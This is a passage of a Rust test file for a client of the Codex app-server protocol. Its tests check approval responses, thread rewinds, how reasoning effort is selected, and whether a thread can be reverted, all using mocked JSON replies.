                    total_processed_tokens: Some(123),
                    context_window: Some(200000),
                    duration_ms: Some(1000),
                    ..
                }),
                ..
            }
        ));
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TurnCheckpoint { .. }
        ));

        let approval_line = include_str!("../../tests/fixtures/codex/v2_messages.jsonl")
            .lines()
            .find(|line| {
                let message: Value = serde_json::from_str(line).unwrap();
                message["method"] == "item/fileChange/requestApproval"
            })
            .expect("native approval request");
        for (decision, wire) in [
            (
                ApprovalDecision::Option("acceptForSession".into()),
                "acceptForSession",
            ),
            (ApprovalDecision::Cancel, "cancel"),
        ] {
            if decision == ApprovalDecision::Cancel {
                // Re-enter through the native request, never a seeded pending map.
                actor.handle_line(approval_line).await;
                assert!(matches!(
                    events.try_recv().unwrap(),
                    AgentEvent::ApprovalRequested(ApprovalRequest { ref id, .. }) if id == "41"
                ));
            }
            actor
                .handle_command(SessionCommand::RespondApproval {
                    request_id: "41".into(),
                    decision: decision.clone(),
                })
                .await
                .unwrap();
            assert!(matches!(
                events.try_recv().unwrap(),
                AgentEvent::ApprovalResolved { ref request_id, decision: resolved }
                    if request_id == "41" && resolved == decision
            ));
            let response = sent(&mut actor).await;
            assert_eq!(response, json!({"id":41, "result":{"decision":wire}}));
        }

        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

/// The 0.166.0 `thread/revert` wire: a finished turn's native id is its
/// restore point; the revert names it as `beforeTurnId`; a turn it stops
/// ends interrupted before the rewind is reported; a refusal keeps
/// Codex's words and says why.
#[test]
fn a_rewind_reverts_the_thread_before_a_finished_turn() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        let next = || events.try_recv().unwrap();
        actor
            .handle_line(
                r#"{"method":"turn/started","params":{"threadId":"thread-1","turn":{"id":"T1"}}}"#,
            )
            .await;
        actor
                .handle_line(r#"{"method":"turn/completed","params":{"threadId":"thread-1","turn":{"id":"T1","status":"completed"}}}"#)
                .await;
        assert!(matches!(next(), AgentEvent::TurnStarted { .. }));
        assert!(matches!(next(), AgentEvent::TurnCompleted { .. }));
        assert_eq!(
            serde_json::to_value(next()).unwrap(),
            json!({"type": "turn_checkpoint", "turn_id": "T1", "checkpoint_id": "T1"})
        );

        actor
            .handle_line(
                r#"{"method":"turn/started","params":{"threadId":"thread-1","turn":{"id":"T2"}}}"#,
            )
            .await;
        assert!(matches!(next(), AgentEvent::TurnStarted { .. }));
        async fn revert(actor: &mut Actor) -> Value {
            actor
                .handle_command(SessionCommand::Rewind {
                    checkpoint_id: "T1".into(),
                    mode: RewindMode::Conversation,
                })
                .await
                .unwrap();
            let request = sent(actor).await;
            assert_eq!(request["method"], "thread/revert");
            assert_eq!(
                request["params"],
                json!({"threadId": "thread-1", "beforeTurnId": "T1"})
            );
            request["id"].clone()
        }
        let id = revert(&mut actor).await;
        actor
                .handle_line(
                    &json!({"id": id, "result": {
                        "thread": {"id": "thread-1", "historyMode": "paginated", "ephemeral": false, "turns": []},
                        "turnsBackwardsCursor": null, "itemsBackwardsCursor": null
                    }})
                    .to_string(),
                )
                .await;
        assert_eq!(
            serde_json::to_value(next()).unwrap(),
            json!({"type": "turn_completed", "turn_id": "T2", "status": "interrupted", "usage": null})
        );
        assert_eq!(
            serde_json::to_value(next()).unwrap(),
            json!({"type": "rewind_completed", "checkpoint_id": "T1", "mode": "conversation",
                       "prefill": null, "later_history": "truncated"})
        );

        let id = revert(&mut actor).await;
        actor
            .handle_line(
                &json!({"id": id, "error": {
                    "code": -32600, "message": "ephemeral threads do not support thread/revert"
                }})
                .to_string(),
            )
            .await;
        assert!(matches!(
            next(),
            AgentEvent::RewindFailed { failure, .. }
                if failure.reason == RewindFailureReason::Unsupported
                    && failure.detail.as_deref().is_some_and(|detail| detail.contains("ephemeral"))
        ));
        assert!(events.try_recv().is_err());
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

/// Replies queued in the order Codex sends them, for a startup step that
/// reads its own replies off the transport.
async fn replies(replies: impl IntoIterator<Item = (i64, Value)>) -> Receiver<ChildOutput> {
    let (tx, rx) = smol::channel::unbounded();
    for (id, result) in replies {
        let reply = json!({"id": id, "result": result}).to_string();
        tx.send(ChildOutput::Line(reply)).await.unwrap();
    }
    rx
}

/// A turn's `collaborationMode` names the model and effort as ChatGPT.app
/// 26.1103 fills them: the chosen effort, else the configured one (the
/// thread's `reasoningEffort`), else the model's own default from
/// `model/list`; the model is the one the thread runs. The replies are
/// `v2/ThreadStartResponse.ts` and `v2/Model.ts` of 0.167.0.
#[test]
fn a_turn_runs_at_the_chosen_then_configured_then_the_models_effort() {
    smol::block_on(async {
        let efforts: Vec<Value> = ["low", "medium", "high"]
            .map(|effort| json!({"reasoningEffort": effort, "description": ""}))
            .into();
        let model = |slug: &str, default: &str, is_default: bool| {
            json!({"id": slug, "model": slug, "upgrade": null, "upgradeInfo": null,
                    "availabilityNux": null, "displayName": slug, "description": "",
                    "modelSpecialty": null, "hidden": false,
                    "supportedReasoningEfforts": efforts,
                    "defaultReasoningEffort": default, "inputModalities": ["text"],
                    "supportsPersonality": false, "multiAgentVersion": null,
                    "additionalSpeedTiers": [], "serviceTiers": [], "defaultServiceTier": null,
                    "availableAccessPrograms": null, "isDefault": is_default})
        };
        for (configured, chosen, effort) in [
            (None, None, "low"),
            (Some("high"), None, "high"),
            (Some("high"), Some("medium"), "medium"),
        ] {
            let (mut actor, _events) = test_actor();
            let thread = json!({
                "id": "thread-1", "sessionId": "session-1", "forkedFromId": null,
                "parentThreadId": null, "preview": "", "ephemeral": false,
                "historyMode": "paginated", "modelProvider": "openai",
                "model": "gpt-6-sol", "reasoningEffort": configured, "createdAt": 1767225600,
                "updatedAt": 1767225600, "status": {"type": "idle"}, "path": null,
                "cwd": "/home/user/project", "cliVersion": "0.167.0",
                "source": "appServer", "projectId": null, "turns": []
            });
            let replies = replies([
                (
                    1,
                    json!({"userAgent": "codex_cli_rs/0.167.0", "codexHome": "/home/user/.codex",
                            "platformFamily": "unix", "platformOs": "linux"}),
                ),
                (
                    2,
                    json!({"thread": thread, "model": "gpt-6-sol", "modelProvider": "openai",
                            "serviceTier": null, "cwd": "/home/user/project",
                            "approvalPolicy": "on-request", "approvalsReviewer": "user",
                            "sandbox": {"type": "workspaceWrite", "writableRoots": [],
                                "networkAccess": false, "excludeTmpdirEnvVar": false,
                                "excludeSlashTmp": false},
                            "activePermissionProfile": null, "reasoningEffort": configured}),
                ),
                (3, json!({"data": [], "nextCursor": null})),
                (4, json!({"data": []})),
                (
                    5,
                    json!({"data": [model("gpt-6-luna", "medium", false),
                            model("gpt-6-sol", "low", true)], "nextCursor": null}),
                ),
            ])
            .await;
            let options = SessionOptions {
                cwd: PathBuf::from("/home/user/project"),
                model: None,
                resume: None,
                fork: None,
                binary_path: None,
                option_selections: Vec::new(),
                mcp_servers: Vec::new(),
                launch_env: LaunchEnv::default(),
                extra_args: Vec::new(),
                acp: None,
                instructions: None,
                processes: Default::default(),
                clock: Default::default(),
                worktrees: Vec::new(),
                write_journal: None,
            };
            let opened = initialize_and_open_thread(&options, &mut actor.stdin, &replies)
                .await
                .unwrap();
            assert!(opened.warnings.is_empty(), "{:?}", opened.warnings);
            assert_eq!(
                written(&mut actor).await.last().unwrap(),
                &json!({"id": 5, "method": "model/list", "params": {"includeHidden": true}})
            );
            actor.model = opened.model;
            actor.default_model = opened.default_model;
            actor.config_effort = opened.config_effort;
            actor.model_efforts = opened.model_efforts;
            if let Some(chosen) = chosen {
                actor
                    .handle_command(SessionCommand::SetOption {
                        id: "reasoningEffort".into(),
                        value: json!(chosen),
                    })
                    .await
                    .unwrap();
            }
            assert_eq!(
                actor.build_turn_params("go on", None, &[])["collaborationMode"]["settings"],
                json!({"model": "gpt-6-sol", "reasoning_effort": effort,
                        "developer_instructions": null}),
                "{configured:?} {chosen:?}"
            );
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        }
    });
}

/// Only a paginated thread written to disk can be reverted, so each
/// session says whether its thread can, from the `thread/start` result
/// (`v2/ThreadStartResponse.ts` and `v2/Thread.ts` of 0.167.0).
#[test]
fn a_thread_says_whether_it_can_be_reverted() {
    smol::block_on(async {
        for (history_mode, ephemeral, unrevertable) in [
            ("paginated", false, None),
            ("legacy", false, Some(RewindFailureReason::Unsupported)),
            ("paginated", true, Some(RewindFailureReason::Unsupported)),
        ] {
            let (mut actor, _events) = test_actor();
            let thread = json!({
                "id": "thread-1", "sessionId": "session-1", "forkedFromId": null,
                "parentThreadId": null, "preview": "", "ephemeral": ephemeral,
                "historyMode": history_mode, "modelProvider": "openai",
                "model": "gpt-5.5", "reasoningEffort": null, "createdAt": 1767225600,
                "updatedAt": 1767225600, "status": {"type": "idle"}, "path": null,
                "cwd": "/home/user/project", "cliVersion": "0.167.0",
                "source": "appServer", "projectId": null, "turns": []
            });
            let replies = replies([
                (
                    1,
                    json!({"userAgent": "codex_cli_rs/0.167.0", "codexHome": "/home/user/.codex",
                            "platformFamily": "unix", "platformOs": "linux"}),
                ),
                (
                    2,
                    json!({"thread": thread, "model": "gpt-5.5", "modelProvider": "openai",
                            "serviceTier": null, "cwd": "/home/user/project",
                            "approvalPolicy": "on-request", "approvalsReviewer": "user",
                            "sandbox": {"type": "workspaceWrite", "writableRoots": [],
                                "networkAccess": false, "excludeTmpdirEnvVar": false,
                                "excludeSlashTmp": false},
                            "activePermissionProfile": null, "reasoningEffort": null}),
                ),
                (3, json!({"data": [], "nextCursor": null})),
                (4, json!({"data": []})),
                (5, json!({"data": [], "nextCursor": null})),
            ])
            .await;
            let options = SessionOptions {
                cwd: PathBuf::from("/home/user/project"),
                model: None,
                resume: None,
                fork: None,
                binary_path: None,
                option_selections: Vec::new(),
                mcp_servers: Vec::new(),
                launch_env: LaunchEnv::default(),
                extra_args: Vec::new(),
                acp: None,
                instructions: None,
                processes: Default::default(),
                clock: Default::default(),
                worktrees: Vec::new(),
                write_journal: None,
            };
            let opened = initialize_and_open_thread(&options, &mut actor.stdin, &replies)
                .await
                .unwrap();
            assert_eq!(
                opened.unrevertable, unrevertable,
                "{history_mode} {ephemeral}"
            );
            assert!(opened.warnings.is_empty(), "{:?}", opened.warnings);
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        }
    });
}
